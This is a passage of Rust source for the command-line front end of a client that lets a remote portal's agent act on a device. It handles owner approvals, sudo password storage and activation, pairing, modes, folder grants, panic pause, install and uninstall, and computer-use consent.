    // the write holds in all): a line further down must not go unseen.
    if let Some(p) = &a.preview {
        for l in p.split('\n') {
            let _ = writeln!(out, "    | {}", visible(l));
        }
    }
    if a.cut {
        let _ = writeln!(
            out,
            "    (too long to show whole, so it can only be denied)"
        );
    }
    let more = if a.choices.contains(&Choice::Chat) {
        format!(", --chat or --minutes 1..{}", a.max_minutes)
    } else {
        String::new()
    };
    if a.choices.contains(&Choice::Once) {
        let _ = writeln!(
            out,
            "    approve {}{more} or deny {}; denied in {secs}s",
            a.id, a.id
        );
    } else {
        let _ = writeln!(out, "    deny {}; denied in {secs}s", a.id);
    }
    out
}

fn show_plan(plan: &[Action]) {
    for a in plan {
        println!("  - {}", a.describe());
    }
}

fn ask(question: &str) -> bool {
    use std::io::Write;
    print!("{question} [y/N] ");
    let _ = std::io::stdout().flush();
    let mut line = String::new();
    std::io::stdin().read_line(&mut line).is_ok()
        && matches!(line.trim().to_lowercase().as_str(), "y" | "yes")
}

fn apply_plan(plan: &[Action]) -> Result<(), String> {
    let hints = actions::apply(plan, Path::new("/"), &actions::System)?;
    for h in hints {
        eprintln!("note: {h}");
    }
    Ok(())
}

/// What `sudo` says on Windows, which has no sudo and no elevation to switch on.
const SUDO_LINUX_ONLY: &str =
    "sudo access is Linux only: Windows has no sudo, and the client never elevates there";

fn sudo_supported(linux: bool) -> Result<(), String> {
    if linux {
        Ok(())
    } else {
        Err(SUDO_LINUX_ONLY.into())
    }
}

/// Whether the owner can be asked: a question needs a terminal to answer in.
fn stdin_is_terminal() -> bool {
    use std::io::IsTerminal;
    std::io::stdin().is_terminal()
}

/// What `sudo status` reports.
struct SudoView {
    active: bool,
    password: bool,
    storage: SecretStorage,
    running: bool,
    root: bool,
    allow_root: bool,
    /// A password file is on disk that the client will not load (memory storage).
    leftover_file: bool,
}

/// `sudo status` as printed, ending in the step that fits.
fn sudo_status_text(v: &SudoView) -> String {
    use std::fmt::Write;
    let mut out = String::new();
    let _ = writeln!(
        out,
        "Sudo access: {}",
        if v.active { "active" } else { "not active" }
    );
    let _ = writeln!(
        out,
        "Password:    {}",
        match (v.password, v.running, v.storage) {
            (true, _, s) => format!("set (kept in {})", s.as_str()),
            // A root client needs no password, so the memory remark is no use.
            (false, false, SecretStorage::Memory) if !v.root => {
                let mut t =
                    "not set (the client is not running, and keeps the password in memory only"
                        .to_string();
                if v.leftover_file {
                    t.push_str("; an old password file is ignored, `pithagoras-sync sudo clear` removes it");
                }
                t.push(')');
                t
            }
            (false, ..) => "not set".to_string(),
        }
    );
    match (v.root, v.running) {
        (true, true) => {
            let _ = writeln!(
                out,
                "Client:      runs as root, so a `sudo` command is an ordinary command: there is nothing to elevate"
            );
        }
        (true, false) if !v.allow_root => {
            let _ = writeln!(
                out,
                "Client:      not running; it refuses to run as root until you allow it"
            );
        }
        (_, false) => {
            let _ = writeln!(out, "Client:      not running");
        }
        (false, true) => {}
    }
    let next = match (v.root, v.active, v.password) {
        (true, ..) if v.running => "nothing to do: the agent's commands run as root already.",
        (true, ..) if !v.allow_root => {
            "as root the client first needs `pithagoras-sync config set policy.privilege.allow_root true`, then start it; its commands then run as root, so there is no sudo to set up."
        }
        (true, ..) => {
            "start the client; its commands then run as root, so there is no sudo to set up."
        }
        (_, true, true) => {
            "nothing to do. The agent can run `sudo <command>`; `pithagoras-sync sudo deactivate` switches it off."
        }
        (_, true, false) => {
            "active, but no password: run `pithagoras-sync sudo set` (without one, sudo only runs what sudoers allows without a password)."
        }
        (_, false, true) => "run `pithagoras-sync sudo activate`.",
        (_, false, false) => "run `pithagoras-sync sudo set`.",
    };
    let _ = writeln!(out, "Next:        {next}");
    out
}

/// Switches `policy.privilege.elevation` in the config and tells the running
/// client, which audits the change with its old and new value as any config
/// change. It reads the config itself, right before it saves, and changes nothing
/// but the elevation: the callers wait for answers, and whatever the owner changed
/// meanwhile (the mode, a folder) must not be written back.
async fn set_elevation(dirs: &Dirs, to: Elevation) -> Result<(), String> {
    let word = if to == Elevation::Sudo {
        "active"
    } else {
        "not active"
    };
    if switch_elevation(dirs, to).await? {
        println!("Sudo access is {word} now.");
    } else {
        println!("Sudo access is {word} already.");
    }
    Ok(())
}

/// `set_elevation` without the words: whether it changed anything. The owner
/// checks are the caller's.
pub(crate) async fn switch_elevation(dirs: &Dirs, to: Elevation) -> Result<bool, String> {
    let mut cfg = load_config(dirs)?;
    if cfg.policy.privilege.elevation == to {
        return Ok(false);
    }
    cfg.policy.privilege.elevation = to;
    cfg.save(&dirs.config_file())?;
    reload_running(dirs).await;
    Ok(true)
}

/// Whether a password is stored: the running client holds one, or (when the
/// client is not running) the file or the keyring has one the client will load,
/// which it does only with file or keyring storage.
pub(crate) async fn sudo_password_set(dirs: &Dirs, storage: SecretStorage) -> Result<bool, String> {
    Ok(
        match control::send(&dirs.socket(), Request::Status).await? {
            Some(r) => r.status.is_some_and(|s| s.elevation_password),
            None => password_kept(dirs, storage).await,
        },
    )
}

/// Whether the file or the keyring has the password the client loads at its
/// next start; with memory storage it has none to load.
pub(crate) async fn password_kept(dirs: &Dirs, storage: SecretStorage) -> bool {
    match storage {
        SecretStorage::Memory => false,
        SecretStorage::File => crate::secrets::file(dirs).exists(),
        // Without unlocking it: a status is no reason for a prompt.
        SecretStorage::Keyring => sync_policy::keyring::system(dirs)
            .has(crate::secrets::ELEVATION)
            .await
            .unwrap_or(false),
    }
}

/// Takes the password from the terminal (or stdin) and gives it to the running
/// client, or to the file for the client's next start. The storage is read after
/// the prompt, not before.
async fn store_password(dirs: &Dirs, stdin: bool) -> Result<(), String> {
    use crate::secrets;
    let value = if stdin {
        secrets::read_from_stdin()?
    } else {
        secrets::read_from_tty(&format!(
            "Password sudo asks {} for (not shown): ",
            info::user().0
        ))?
    };
    match keep_password(dirs, value).await? {
        Kept::InClient => println!("Password stored in the client."),
        Kept::ForNextStart => println!("Password stored for the client's next start."),
        Kept::Nowhere => {
            return Err(
                "the client is not running, and it keeps the password in memory only (policy.privilege.secret_storage = memory); start it first".into(),
            );
        }
    }
    Ok(())
}

/// Where `keep_password` put the password.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Kept {
    /// The running client holds it (and stores it as its storage says).
    InClient,
    /// In the file or the keyring, for the client's next start.
    ForNextStart,
    /// Nowhere: the client is not running and keeps it in memory only.
    Nowhere,
}

/// Gives the password to the running client, or to the file or keyring for
/// the client's next start. The owner checks are the caller's.
pub(crate) async fn keep_password(
    dirs: &Dirs,
    value: sync_policy::secret::Secret,
) -> Result<Kept, String> {
    use crate::secrets;
    match control::send(
        &dirs.socket(),
        Request::SecretSet {
            name: secrets::ELEVATION.into(),
            value: value.clone(),
        },
    )
    .await?
    {
        Some(r) if r.ok => Ok(Kept::InClient),
        Some(r) => Err(r.error.unwrap_or_default()),
        None => {
            let storage = load_config(dirs)?.policy.privilege.secret_storage;
            if storage == SecretStorage::Memory {
                return Ok(Kept::Nowhere);
            }
            let keyring = sync_policy::keyring::system(dirs);
            secrets::store(dirs, storage, keyring.as_ref(), &value).await?;
            Ok(Kept::ForNextStart)
        }
    }
}

/// Forgets the password: in the running client, or where it is stored. The
/// owner checks are the caller's.
pub(crate) async fn forget_password(dirs: &Dirs) -> Result<(), String> {
    use crate::secrets;
    match control::send(
        &dirs.socket(),
        Request::SecretClear {
            name: secrets::ELEVATION.into(),
        },
    )
    .await?
    {
        Some(r) if !r.ok => Err(r.error.unwrap_or_default()),
        Some(_) => Ok(()),
        None => {
            let storage = load_config(dirs)?.policy.privilege.secret_storage;
            let keyring = sync_policy::keyring::system(dirs);
            secrets::forget(dirs, storage, keyring.as_ref()).await
        }
    }
}

async fn sudo_cmd(dirs: &Dirs, cmd: SudoCmd) -> Result<(), String> {
    sudo_supported(cfg!(target_os = "linux"))?;
    match cmd {
        SudoCmd::Status => {
            let cfg = load_config(dirs)?;
            let running = control::send(&dirs.socket(), Request::Status)
                .await?
                .is_some();
            let storage = cfg.policy.privilege.secret_storage;
            let view = SudoView {
                active: cfg.policy.privilege.elevation == Elevation::Sudo,
                password: sudo_password_set(dirs, storage).await?,
                storage,
                running,
                root: is_root(),
                allow_root: cfg.policy.privilege.allow_root,
                leftover_file: storage == SecretStorage::Memory
                    && crate::secrets::file(dirs).exists(),
            };
            print!("{}", sudo_status_text(&view));
        }
        SudoCmd::Set { stdin, activate } => {
            owner_edit(dirs).await?;
            store_password(dirs, stdin).await?;
            // Read again: the password prompt may have waited a long time.
            if load_config(dirs)?.policy.privilege.elevation == Elevation::Sudo {
                println!("Sudo access is active.");
            } else if activate
                || (!stdin
                    && stdin_is_terminal()
                    && ask("Do you want to activate sudo access now?"))
            {
                set_elevation(dirs, Elevation::Sudo).await?;
            } else {
                println!(
                    "Sudo access is not active yet: `pithagoras-sync sudo activate` switches it on."
                );
            }
        }
        SudoCmd::Activate { no_password } => {
            let cfg = owner_edit(dirs).await?;
            // As root there is nothing to elevate and no password to ask for; and
            // a sudoers rule that asks none needs none stored.
            if !no_password
                && !is_root()
                && !sudo_password_set(dirs, cfg.policy.privilege.secret_storage).await?
            {
                println!(
                    "No password is stored for sudo, so sudo access would only run what sudoers allows without one."
                );
                if !(stdin_is_terminal() && ask("Do you want to set a password now?")) {
                    return Err(
                        "not activated: run `pithagoras-sync sudo set` to store a password, or `pithagoras-sync sudo activate --no-password` if a sudoers rule lets you run sudo without one".into(),
                    );
                }
                store_password(dirs, false).await?;
            }
            set_elevation(dirs, Elevation::Sudo).await?;
        }
        SudoCmd::Deactivate => {
            owner::not_from_own_command(dirs).await?;
            set_elevation(dirs, Elevation::Off).await?;
        }
        SudoCmd::Clear { deactivate } => {
            owner::not_from_own_command(dirs).await?;
            forget_password(dirs).await?;
            println!("Password forgotten.");
            let cfg = load_config(dirs)?;
            if cfg.policy.privilege.elevation == Elevation::Sudo {
                if deactivate
                    || (stdin_is_terminal()
                        && ask(
                            "Sudo access is still active, but works only for what sudoers allows without a password. Deactivate it too?",
                        ))
                {
                    set_elevation(dirs, Elevation::Off).await?;
                } else {
                    println!(
                        "Sudo access stays active: `pithagoras-sync sudo deactivate` switches it off."
                    );
                }
            }
        }
    }
    Ok(())
}

/// The pairing link when the program was started with one alone, as the
/// browser hands it over (`pithagoras-sync <link>`).
pub fn link_argument(args: &[std::ffi::OsString]) -> Option<String> {
    let [_, arg] = args else { return None };
    let arg = arg.to_str()?;
    let scheme = format!("{}:", install::SCHEME);
    sync_connector::url::strip_prefix_ci(arg, &scheme).map(|_| arg.to_string())
}

/// Whether SIGPIPE may end this command quietly when its output is cut off
/// (`| head`), as it does command line tools. Never the client itself, nor the
/// graphical flow: a start without a command is how a double click begins it,
/// and it writes the password to a `sudo` that may have exited.
pub fn dies_on_sigpipe(cmd: Option<&Cmd>) -> bool {
    !matches!(cmd, None | Some(Cmd::Run { .. } | Cmd::Gui { .. }))
}

/// Whether a start without a command is a double click or the menu's: no
/// terminal and a display to show windows on (the units `install` and `setup`
/// write always name `run`). On Windows: a console window that Windows opened
/// for this program alone.
fn gui_without_command() -> bool {
    #[cfg(windows)]
    return console_is_ours_alone();
    #[cfg(not(windows))]
    {
        use std::io::IsTerminal;
        let terminal = std::io::stdin().is_terminal() && std::io::stdout().is_terminal();
        !terminal && crate::dialogs::has_display()
    }
}

/// Whether the console belongs to this process only: Explorer made it for a
/// double click, so nobody reads it.
#[cfg(windows)]
fn console_is_ours_alone() -> bool {
    use windows_sys::Win32::System::Console::GetConsoleProcessList;
    let mut ids = [0u32; 4];
    // SAFETY: the buffer holds `ids.len()` process ids.
    unsafe { GetConsoleProcessList(ids.as_mut_ptr(), ids.len() as u32) == 1 }
}

/// The graphical flow (`gui`, a pairing link, a double click).
async fn gui(dirs: &Dirs, link: Option<String>) -> Result<ExitCode, String> {
    // The owner's login and sudo passwords pass through this process: as the
    // client does, it keeps other processes of the user (the commands an agent
    // runs among them) out of its memory, and asks for none while traced.
    #[cfg(target_os = "linux")]
    sync_policy::secret::undumpable();
    // What the commands it runs print (the purge's list) is for a terminal;
    // here nobody reads it, and a pipe closed meanwhile must not end an
    // uninstall halfway.
    #[cfg(unix)]
    if let Ok(null) = std::fs::OpenOptions::new().write(true).open("/dev/null") {
        use std::os::fd::AsRawFd;
        // SAFETY: points fd 1 at /dev/null; `null` stays open until then.
        unsafe { libc::dup2(null.as_raw_fd(), 1) };
    }
    #[cfg(windows)]
    if console_is_ours_alone() {
        crate::actions::let_go_of_console();
    }
    let lang = crate::i18n::Lang::detect();
    #[cfg(windows)]
    let d: Box<dyn crate::dialogs::Dialogs> = Box::new(crate::dialogs::WinDialogs(lang));
    #[cfg(not(windows))]
    let d: Box<dyn crate::dialogs::Dialogs> = match crate::dialogs::Native::find(lang) {
        Some(n) => Box::new(n),
        None => {
            crate::gui::say_without_dialogs(dirs, lang.no_dialogs()).await;
            return Ok(ExitCode::from(1));
        }
    };
    #[cfg(target_os = "linux")]
    if sync_policy::secret::traced() {
        d.error(lang.traced());
        return Ok(ExitCode::from(1));
    }
    let host = crate::gui::RealHost { dirs: dirs.clone() };
    // Awaited here, on the thread in `block_on`, never spawned: its dialogs and
    // programs block for minutes, and this way hold none of the runtime's
    // workers.
    Ok(
        match crate::gui::flow(d.as_ref(), &host, lang, link.as_deref()).await {
            crate::gui::Outcome::Done => ExitCode::SUCCESS,
            _ => ExitCode::from(1),
        },
    )
}

pub async fn run(cli: Cli) -> Result<ExitCode, String> {
    let dirs = Dirs::from_env()?;
    let Some(cmd) = cli.cmd else {
        if gui_without_command() {
            return gui(&dirs, None).await;
        }
        // In a terminal, as before; and nothing else without a display.
        eprint!("{}", <Cli as clap::CommandFactory>::command().render_help());
        return Ok(ExitCode::from(2));
    };
    match cmd {
        Cmd::Gui { link, link_option } => return gui(&dirs, link.or(link_option)).await,
        Cmd::Run { detach } => {
            if detach {
                // Without a console the log would go nowhere; the file is capped.
                if let Err(e) = crate::secrets::log_to_file(log_file(&dirs)) {
                    eprintln!("pithagoras-sync: no log file: {e}");
                }
                #[cfg(windows)]
                crate::actions::let_go_of_console();
            }
            let ran = crate::daemon::run(dirs).await;
            if detach && let Err(e) = &ran {
                // Why it stopped, for the owner reading the file later.
                tracing::error!("{e}");
            }
            if ran? {
                // A failure code, so Restart=on-failure (or the logon task's
                // restart) starts the client again.
                return Ok(ExitCode::from(RESTART_EXIT));
            }
        }
        Cmd::Pair { uri, name } => {
            let cfg = owner_edit(&dirs).await?;
            if let Some(old) = &cfg.portal {
                println!("Replacing the pairing with {}.", old.url);
            }
            if is_root() {
                eprintln!(
                    "{}",
                    root_warning(cfg!(windows), cfg.policy.privilege.allow_root)
                );
            }
            let done = pair_device(&dirs, cfg, &uri, name).await?;
            for n in &done.notes {
                eprintln!("note: {n}");
            }
            let p = &done.portal;
            println!(
                "Paired with {} as {} (device {}).",
                p.url, p.name, p.device_id
            );
            if let Some(n) = http_note(&p.url) {
                println!("{n}");
            }
            println!("Mode: {:?}.", done.mode);
            if let Some(n) = mode_hint(done.mode, done.folders_empty) {
                println!("{n}");
            }
            if done.running {
                println!("The running client connects now.");
            } else {
                println!("{}", start_hint());
            }
        }
        Cmd::Unpair => {
            owner::not_from_own_command(&dirs).await?;
            let mut cfg = DeviceConfig::load(&dirs.config_file())?;
            let tokens = token_store(&dirs, &cfg);
            cfg.portal = None;
            cfg.save(&dirs.config_file())?;
            // The running client lets go of the portal before the token goes:
            // a keyring that fails here must not leave it connected.
            reload_running(&dirs).await;
            tokens.delete().await.map_err(|e| {
                format!("unpaired (the config names no portal now, and a running client was told), but {e}; run `unpair` again to remove the token")
            })?;
            println!("Unpaired. Remove the device in the portal as well.");
        }
        Cmd::Status { json } => match control::send(&dirs.socket(), Request::Status).await? {
            Some(r) => match r.status {
                Some(s) if json => {
                    println!("{}", serde_json::to_string_pretty(&s).unwrap_or_default())
                }
                Some(s) => print_status(&s),
                None => return Err(r.error.unwrap_or_default()),
            },
            None => {
                let cfg = DeviceConfig::load(&dirs.config_file())?;
                if json {
                    println!("{}", serde_json::json!({"running": false}));
                } else {
                    println!("pithagoras-sync is not running.");
                    match &cfg.portal {
                        Some(p) => println!(
                            "Paired with {} as {} (token kept in the {}).",
                            p.url,
                            p.name,
                            token_store(&dirs, &cfg).describe()
                        ),
                        None => println!("Not paired."),
                    }
                    println!(
                        "Mode: {}",
                        mode_text(
                            cfg.policy.effective_mode(cfg.profile, now_ms()),
                            cfg.policy.full.until_ms
                        )
                    );
                    if dirs.paused_file().exists() {
                        println!("Paused: it will start paused.");
                    }
                }
                return Ok(ExitCode::from(3));
            }
        },
        Cmd::Panic => match control::send(&dirs.socket(), Request::Panic).await? {
            Some(r) if r.ok => {
                println!("Paused: link closed, commands killed. `pithagoras-sync unlock` ends it.")
            }
            Some(r) => return Err(r.error.unwrap_or_default()),
            None => {
                sync_policy::config::write_private(&dirs.paused_file(), b"")
                    .map_err(|e| e.to_string())?;
                // An allow of computer use ends with the pause, as in the client.
                if let Ok(mut cfg) = DeviceConfig::load(&dirs.config_file())
                    && cfg.policy.computer_use.consent == sync_policy::Consent::Allow
                {
                    cfg.policy.computer_use.consent = sync_policy::Consent::Off;
                    cfg.policy.computer_use.until_ms = None;
                    cfg.save(&dirs.config_file())?;
                }
                println!("The client is not running; it will start paused.");
            }
        },
        Cmd::Unlock => {
            owner_edit(&dirs).await?;
            match control::send(&dirs.socket(), Request::Unlock).await? {
                Some(r) if r.ok => println!("Unlocked."),
                Some(r) => return Err(r.error.unwrap_or_default()),
                None => {
                    match std::fs::remove_file(dirs.paused_file()) {
                        Err(e) if e.kind() != std::io::ErrorKind::NotFound => {
                            return Err(e.to_string());
                        }
                        _ => {}
                    }
                    println!("Unlocked.");
                }
            }
        }
        Cmd::Toggle => {
            eprintln!(
                "toggle shows the quick-ask overlay, which comes with the desktop app (phase 2); this build has none."
            );
            return Ok(ExitCode::from(2));
        }
        Cmd::Mode { mode, expiry_hours } => {
            let Some(mode) = mode else {
                let cfg = load_config(&dirs)?;
                println!(
                    "{}",
                    mode_text(
                        cfg.policy.effective_mode(cfg.profile, now_ms()),
                        cfg.policy.full.until_ms
                    )
                );
                return Ok(ExitCode::SUCCESS);
            };
            let mut cfg = owner_edit(&dirs).await?;
            if let Some(h) = expiry_hours {
                cfg.policy.full.expiry_hours = h;
            }
            cfg.policy.set_mode(mode.into(), now_ms());
            cfg.save(&dirs.config_file())?;
            if cfg.policy.mode == Mode::Full {
                println!(
                    "Full mode: the portal's agent can do whatever {} can do here{}.",
                    info::user().0,
                    full_for(cfg.policy.full.expiry_hours)
                );
            }
            println!(
                "Mode: {}",
                mode_text(cfg.policy.mode, cfg.policy.full.until_ms)
            );
            reload_running(&dirs).await;
        }
        Cmd::Folder { cmd } => match cmd {
            FolderCmd::List => {
                let cfg = DeviceConfig::load(&dirs.config_file())?;
                // The portal may have set these paths (`portal_policy = write`).
                for f in &cfg.policy.folders {
                    let x = if f.execute { ", exec" } else { "" };
                    let path = sync_policy::approve::visible(&f.path.display().to_string());
                    println!("{path} ({}{x})", access_text(f.access));
                }
            }
            FolderCmd::Add { path, rw, exec } => {
                let mut cfg = owner_edit(&dirs).await?;
                let path = canonical_folder(&path)?;
                let access = if rw { Access::Rw } else { Access::Ro };
                cfg.policy.folders.retain(|f| f.path != path);
                cfg.policy.folders.push(FolderGrant {
                    path: path.clone(),
                    access,
                    execute: exec,
                });
                cfg.save(&dirs.config_file())?;
                println!(
                    "Granted {} ({}{}).",
                    path.display(),
                    access_text(access),
                    if exec { ", commands run here" } else { "" }
                );
                reload_running(&dirs).await;
            }
            FolderCmd::Remove { path } => {
                let mut cfg = owner_edit(&dirs).await?;
                let canonical = canonical_folder(&path).ok();
                let before = cfg.policy.folders.len();
                cfg.policy
                    .folders
                    .retain(|f| f.path != path && Some(&f.path) != canonical.as_ref());
                if cfg.policy.folders.len() == before {
                    return Err(format!("{} is not granted", path.display()));
                }
                cfg.save(&dirs.config_file())?;
                println!("Removed {}.", path.display());
                reload_running(&dirs).await;
            }
        },
        Cmd::Config { cmd } => {
            let (key, op) = match cmd {
                ConfigCmd::Get { key } => {
                    let cfg = load_config(&dirs)?;
                    let v = config_cmd::get(&cfg, key.as_deref())?;
                    match v {
                        serde_json::Value::String(s) => println!("{s}"),
                        v => println!("{}", serde_json::to_string_pretty(&v).unwrap_or_default()),
                    }
                    return Ok(ExitCode::SUCCESS);
                }
                ConfigCmd::Set { key, value } => (key, Op::Set(config_cmd::parse_value(&value))),
                ConfigCmd::Unset { key } => (key, Op::Unset),
                ConfigCmd::Add { key, value } => (key, Op::Add(config_cmd::parse_value(&value))),
                ConfigCmd::Remove { key, value } => {
                    (key, Op::Remove(config_cmd::parse_value(&value)))
                }
            };
            let cfg = owner_edit(&dirs).await?;
            let next = config_cmd::edit(&cfg, &key, op, now_ms())?;
            if key == "token_storage" {
                // The token moves with the setting: to its new place first, then
                // the setting, then away from the old place.
                let from = token_store(&dirs, &cfg);
                let to = token_store(&dirs, &next);
                let paired = cfg.portal.is_some();
                for n in from
                    .switch(&to, paired, || next.save(&dirs.config_file()))
                    .await?
                {
                    eprintln!("note: {n}");
                }
            } else {
                next.save(&dirs.config_file())?;
            }
            let v = config_cmd::get(&next, Some(&key))?;
            println!("{key} = {v}");
            if key == "profile" {
                println!("Restart the client for the profile to take effect.");
            }
            reload_running(&dirs).await;
        }
        Cmd::Approvals { json } => {
            owner::not_from_own_command(&dirs).await?;
            let reply = to_running(&dirs, Request::Approvals).await?;
            let list = reply.approvals.unwrap_or_default();
            if json {
                println!(
                    "{}",
                    serde_json::to_string_pretty(&list).unwrap_or_default()
                );
            } else if list.is_empty() {
                println!("Nothing waits for an approval.");
            }
            if !json {
                list.iter().for_each(print_approval);
                if let Some(n) = reply.left_out {
                    println!(
                        "{n} more waiting, left out because the list is too long to show at once; answer some of these first"
                    );
                }
            }
        }
        Cmd::Approve { id, chat, minutes } => {
            owner::not_from_own_command(&dirs).await?;
            let answer = match (chat, minutes) {
                (true, _) => Choice::Chat,
                (_, Some(_)) => Choice::Time,
                _ => Choice::Once,
            };
            to_running(
                &dirs,
                Request::Answer {
                    id,
                    answer,
                    minutes,
                },
            )
            .await?;
            println!("Allowed #{id}.");
        }
        Cmd::Deny { id } => {
            owner::not_from_own_command(&dirs).await?;
            to_running(
                &dirs,
                Request::Answer {
                    id,
                    answer: Choice::Deny,
                    minutes: None,
                },
            )
            .await?;
            println!("Denied #{id}.");
        }
        Cmd::Sudo { cmd } => sudo_cmd(&dirs, cmd).await?,
        Cmd::Update { check, manifest } => {
            let asked = if check { Asked::Check } else { Asked::Anything };
            let client = update(&dirs, manifest.as_deref(), asked, &mut |l| println!("{l}")).await;
            // The computer-use server moves with its own pins, also when there
            // is no newer client (or this build cannot update itself).
            let mcp = crate::computer_use::update(&dirs, check, &mut |l| println!("{l}")).await;
            if let Ok(u) = &mcp
                && !check
                && !u.changed.is_empty()
            {
                reload_running(&dirs).await;
            }
            match (client, mcp) {
                (Err(e), Ok(u)) if !u.changed.is_empty() || dirs_have_mcp(&dirs) => {
                    eprintln!("pithagoras-sync: {e}");
                }
                (Err(e), _) => return Err(e),
                (Ok(_), Err(e)) => return Err(e),
                _ => {}
            }
        }
        Cmd::ComputerUse { cmd } => return computer_use_cmd(&dirs, cmd).await,
        Cmd::Install {
            system,
            user,
            no_linger,
            computer_use,
            print,
        } => {
            let exe = this_program()?;
            let plan = install_plan(system, user.as_deref(), !no_linger, &exe)?;
            println!("Install:");
            show_plan(&plan);
            if computer_use {
                for l in
                    crate::computer_use::plan(&dirs, &crate::computer_use::store(&dirs).current())?
                {
                    println!("  {l}");
                }
            }
            if !print {
                apply_plan(&plan)?;
                println!("Installed. `pithagoras-sync status` shows the running client.");
                if system && let Some(w) = crate::update::installed_warning(&crate::update::RealFs)
                {
                    eprintln!("{w}");
                }
                if computer_use {
                    install_computer_use(&dirs).await?;
                }
            }
        }
        Cmd::Uninstall {
            system,
            purge: true,
            yes,
            print,
        } => {
            let mut hints = Vec::new();
            let r = purge(&dirs, system, print, yes, false, &mut hints).await;
            for h in hints {
                eprintln!("note: {h}");
            }
            return r;
        }
        Cmd::Uninstall { system, print, .. } => {
            let plan = uninstall_plan(system)?;
            println!("Uninstall:");
            show_plan(&plan);
            if dirs_have_mcp(&dirs) {
                println!(
                    "  remove the computer-use server in {}",
                    dirs.mcp_dir().display()
                );
            }
            if !print {
                apply_plan(&plan)?;
                if dirs_have_mcp(&dirs) {
                    crate::computer_use::uninstall_all(&dirs)?;
                }
                println!("Uninstalled.");
            }
        }
        Cmd::Setup {
            create_user,
            remove,
            name,
            yes,
            print,
        } => {
            if !cfg!(target_os = "linux") {
                return Err("setup is for Linux servers".into());
            }
            if !is_root() && !print {
                return Err("setup needs root: sudo pithagoras-sync setup ...".into());
            }
            let runner = actions::System;
            let plan = if create_user {
                let exe = this_program()?;
                setup::create_plan(&runner, Path::new("/"), &name, &exe)?
            } else {
                debug_assert!(remove);
                setup::remove_plan(&runner, &name)?
            };
            println!("This will:");
            show_plan(&plan);
            if remove {
                println!("  (the home folder of {name} and everything in it is deleted)");
            }
            if print {
                return Ok(ExitCode::SUCCESS);
            }
            if !yes && !ask("Go ahead?") {
                println!("Nothing changed.");
                return Ok(ExitCode::from(1));
            }
            apply_plan(&plan)?;
            if create_user {
                print!("{}", setup::next_steps(&name, setup::on_path("setfacl")));
                if let Some(w) = crate::update::installed_warning(&crate::update::RealFs) {
                    eprintln!("{w}");
                }
            } else {
                println!("Removed.");
            }
        }
    }
    Ok(ExitCode::SUCCESS)
}

/// Whether a computer-use server is installed (or its folder is left).
fn dirs_have_mcp(dirs: &Dirs) -> bool {
    DeviceConfig::load(&dirs.config_file()).is_ok_and(|c| !c.mcp.is_empty())
        || dirs.mcp_dir().exists()
}

async fn install_computer_use(dirs: &Dirs) -> Result<(), String> {
    owner::not_from_own_command(dirs).await?;
    let installed = crate::computer_use::install_now(dirs, &mut |l| println!("  {l}")).await?;
    println!("Computer use: {installed} is installed.");
    reload_running(dirs).await;
    let cfg = load_config(dirs)?;
    if cfg.policy.computer_use.consent == sync_policy::Consent::Off {
        println!(
            "Computer use stays off until you allow it: `pithagoras-sync computer-use ask` (each chat asks) or `computer-use allow --minutes N`."
        );
    }
    println!("Next: `pithagoras-sync computer-use setup`, then `computer-use test`.");
    Ok(())
}

async fn computer_use_cmd(dirs: &Dirs, cmd: ComputerUseCmd) -> Result<ExitCode, String> {
    use crate::computer_use as cu;
    use sync_policy::Consent;
    match cmd {
        ComputerUseCmd::Install { print } => {
            if print {
                let store = cu::store(dirs);
                let mut doc = store.current();
                if store.key.is_some() {
                    match sync_mcp::pins::peek(&store, &sync_mcp::pins::pins_url()).await {
                        Ok(d) if d.serial > doc.serial => doc = d,
                        Ok(_) => {}
                        Err(e) => println!("note: no newer pins: {e}"),
                    }
                }
                for l in cu::plan(dirs, &doc)? {
                    println!("{l}");
                }
                return Ok(ExitCode::SUCCESS);
            }
            owner_edit(dirs).await?;
            install_computer_use(dirs).await?;
        }
        ComputerUseCmd::Uninstall => {
            owner::not_from_own_command(dirs).await?;
            let removed = cu::uninstall_all(dirs)?;
            reload_running(dirs).await;
            if removed.is_empty() {
                println!("No computer-use server was installed.");
            } else {
                println!("Removed {}.", removed.join(", "));
            }
        }
        ComputerUseCmd::Update { check } => {
            owner::not_from_own_command(dirs).await?;
            let u = cu::update(dirs, check, &mut |l| println!("{l}")).await?;
            if !check && !u.changed.is_empty() {
                reload_running(dirs).await;
            }
            if load_config(dirs)?.mcp.is_empty() {
                println!("No computer-use server is installed.");
            }
        }
        ComputerUseCmd::Rollback => {
            owner_edit(dirs).await?;
            let r = cu::rollback(dirs)?;
            println!("Computer use: back to {r}.");
            reload_running(dirs).await;
        }
        ComputerUseCmd::Allow { minutes } => {
            let mut cfg = owner_edit(dirs).await?;
            cfg.policy
                .computer_use
                .set(Consent::Allow, Some(minutes), now_ms())?;
            cfg.save(&dirs.config_file())?;
            println!(
                "Computer use is allowed without asking until {}, then off. That is as strong as Full mode: the agent can see your screen and click and type anything you can, a terminal included. `pithagoras-sync computer-use off` or `panic` ends it.",
                cu::consent_text(&cfg, now_ms()).trim_start_matches("allow until ")
            );
            reload_running(dirs).await;
        }
        ComputerUseCmd::Ask => {
            let mut cfg = owner_edit(dirs).await?;
            cfg.policy.computer_use.set(Consent::Ask, None, now_ms())?;
            cfg.save(&dirs.config_file())?;
            println!(
                "Computer use asks in each chat before its first call (once, for this chat, or deny), in the portal or with `pithagoras-sync approvals`. Allowing it is as strong as Full mode."
            );
            reload_running(dirs).await;
        }
        ComputerUseCmd::Off => {
            let mut cfg = load_config(dirs)?;
            cfg.policy.computer_use.set(Consent::Off, None, now_ms())?;
            cfg.save(&dirs.config_file())?;
            println!("Computer use is off: every call is refused.");
            reload_running(dirs).await;
        }
        ComputerUseCmd::Status { json } => return computer_use_status(dirs, json).await,
        ComputerUseCmd::Setup { yes } => computer_use_setup(dirs, yes)?,
        ComputerUseCmd::Test { verbose } => {
            owner::not_from_own_command(dirs).await?;
            let steps = match control::send(&dirs.socket(), Request::McpTest { verbose }).await? {
                Some(r) if r.ok => {
                    println!("(on the running client's server)");
                    r.mcp.map(|m| m.test).unwrap_or_default()
                }
                Some(r) => return Err(r.error.unwrap_or_default()),
                None => cu::test_here(dirs, verbose).await?,
            };
            let mut ok = true;
            for s in &steps {
                ok &= s.ok;
                println!("{} {}", if s.ok { "ok    " } else { "FAILED" }, s.text);
            }
            if !ok {
                println!(
                    "Not every step passed: `pithagoras-sync computer-use setup` lists what the server needs."
                );
                return Ok(ExitCode::from(1));
            }
        }
    }
    Ok(ExitCode::SUCCESS)
}

